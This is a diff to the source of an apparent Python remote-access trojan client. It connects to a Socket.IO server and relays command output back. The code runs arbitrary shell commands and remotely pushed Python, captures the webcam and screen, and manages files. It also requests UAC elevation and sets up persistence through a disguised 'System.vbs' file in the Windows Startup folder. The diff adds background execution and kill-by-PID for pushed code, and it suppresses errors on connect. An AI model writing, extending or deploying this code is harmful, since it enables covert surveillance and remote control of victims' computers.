@@ -43,19 +43,19 @@ def getFileName(ext):
     timeStamp = time.strftime("%Y-%m-%d-%H-%M-%S")
     return os.path.join(TEMP, f"{timeStamp}-{randomString(5)}.{ext}")
 
-def _exit():
-    SIO.disconnect()
-    os._exit(0)
-
 def toServer(data):
     if not SIO.connected: return
     SIO.emit("to-server", data)
 
 def pipInstall(t, args):
+    toServer({
+        "type": t,
+        "output": f"Please wait, installing dependencies. Running pip {args}"
+    })
     Python({
         "type": t,
-        "app": "pip",
-        "args": args
+        "action": "pip",
+        "pipArgs": args
     })
 
 def postFile(t, filePath):
@@ -85,12 +85,12 @@ class Terminal:
             self.value = f"{self.app} {self.value}"
 
         result = subprocess.run(
-            self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+            self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
         )
 
         toServer({
             "type": self.type,
-            "output": result.stdout if result.returncode == 0 else result.stderr
+            "output": result.stdout
         })
     
 class Webcam:
@@ -104,11 +104,6 @@ class Webcam:
         try:
             import cv2
         except ImportError:
-            toServer({
-                "type": self.type,
-                "output": "Please wait, installing dependencies..."
-            })
-
             return pipInstall(self.type, "install opencv-python")
         
         device = cv2.VideoCapture(self.deviceIndex, cv2.CAP_DSHOW)
@@ -164,11 +159,6 @@ class Display:
             import av
             import numpy as np
         except ImportError:
-            toServer({
-                "type": self.type,
-                "output": "Please wait, installing dependencies..."
-            })
-
             return pipInstall(self.type, "install av numpy")
         
         global DISPLAY_IS_RECORDING
@@ -357,41 +347,70 @@ class FileManager:
             "folders": folders
         })
 
+PYTHON_SUBPROCESS_PID = None
 class Python:
     def __init__(self, options):
         self.type = options.get("type")
-        self.app = options.get("app")
-        self.args = options.get("args")
+        self.action = options.get("action")
+        self.pipArgs = options.get("pipArgs")
         self.code = options.get("code", "")
 
-        if self.app == "python":
+        if self.action == "run":
             self.run()
-        elif self.app == "pip":
+        elif self.action == "kill":
+            self.kill()
+        elif self.action == "pip":
             self.pip()
     
     def run(self):
+        global PYTHON_SUBPROCESS_PID
+        if PYTHON_SUBPROCESS_PID is not None:
+            return toServer({
+                "type": self.type,
+                "output": f"Already running on PID: {PYTHON_SUBPROCESS_PID}"
+            })
+        
         filename = getFileName("py")
         with open(filename, "w") as f:
             f.write(self.code)
-        result = subprocess.run(f'"{sys.executable}" "{filename}"', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        process = subprocess.Popen([sys.executable, filename], shell=False, text=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, start_new_session=True)
+        PYTHON_SUBPROCESS_PID = process.pid
         toServer({
             "type": self.type,
-            "output": result.stdout if result.returncode == 0 else result.stderr
+            "output": f"Python subprocess started successfully on PID: {PYTHON_SUBPROCESS_PID}",
+            "pid": PYTHON_SUBPROCESS_PID
         })
-        os.remove(filename)
+        output = []
+        for line in process.stdout:
+            output.append(line.strip())
+        PYTHON_SUBPROCESS_PID = None
+        toServer({
+            "type": self.type,
+            "output": '\n'.join(output),
+            "pid": PYTHON_SUBPROCESS_PID
+        })
+    
+    def kill(self):
+        global PYTHON_SUBPROCESS_PID
+        if PYTHON_SUBPROCESS_PID is None:
+            return toServer({
+                "type": self.type,
+                "output": f"Python subprocess is not running"
+            })
+        os.kill(PYTHON_SUBPROCESS_PID, 9)
+        toServer({
+            "type": self.type,
+            "output": f"Python subprocess killed successfully on PID: {PYTHON_SUBPROCESS_PID}"
+        })
+        PYTHON_SUBPROCESS_PID = None
         
     def pip(self):
-        if not self.args: return
+        if not self.pipArgs: return
         pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
+        result = subprocess.run(f'"{pipPath}" {self.pipArgs}', shell=True, text=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
         toServer({
             "type": self.type,
-            "output": f"Running pip {self.args}"
-        })
-
-        result = subprocess.run(f'"{pipPath}" {self.args}', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        toServer({
-            "type": self.type,
-            "output": result.stdout if result.returncode == 0 else result.stderr
+            "output": result.stdout
         })
 
 class Others:
@@ -404,7 +423,7 @@ class Others:
         elif self.action == "startup":
             self.startup()
         elif self.action == "exit":
-            self.exit()
+            os._exit(0)
     
     def uac(self):
         if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -413,7 +432,7 @@ class Others:
                 "type": self.type,
                 "output": f"UAC request is accepted. New ID: {ID}-UAC" if res == 42 else "UAC request is denied"
             })
-            if res == 42: _exit()
+            if res == 42: os._exit(0)
                 
     def startup(self):
         startupFile = os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","System.vbs")
@@ -424,9 +443,6 @@ CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & p
             "type": self.type,
             "output": f"Startup file created successfully" if os.path.exists(startupFile) else f"Startup file creation failed"
         })
-
-    def exit(self):
-        _exit()
 
 HANDLER_MAP = {
     "terminal": Terminal,
@@ -442,14 +458,16 @@ HANDLER_MAP = {
 
 @SIO.on("connect")
 def onConnect():
-    a = os.path.join(os.environ.get("APPDATA"), "hasPython")
-    if not os.path.exists(a):
-        os.mkdir(a)
-    SIO.emit("to-server", {
-        "type": "terminal",
-        "output": f"Current Directory: {os.getcwd()}",
-        "cwd": os.getcwd()
-    })
+    try:
+        a = os.path.join(os.environ.get("APPDATA"), "hasPython")
+        if not os.path.exists(a):
+            os.mkdir(a)
+        SIO.emit("to-server", {
+            "type": "terminal",
+            "output": f"Current Directory: {os.getcwd()}",
+            "cwd": os.getcwd()
+        })
+    except: pass
 
 @SIO.on("disconnect")
 def onDisconnect():
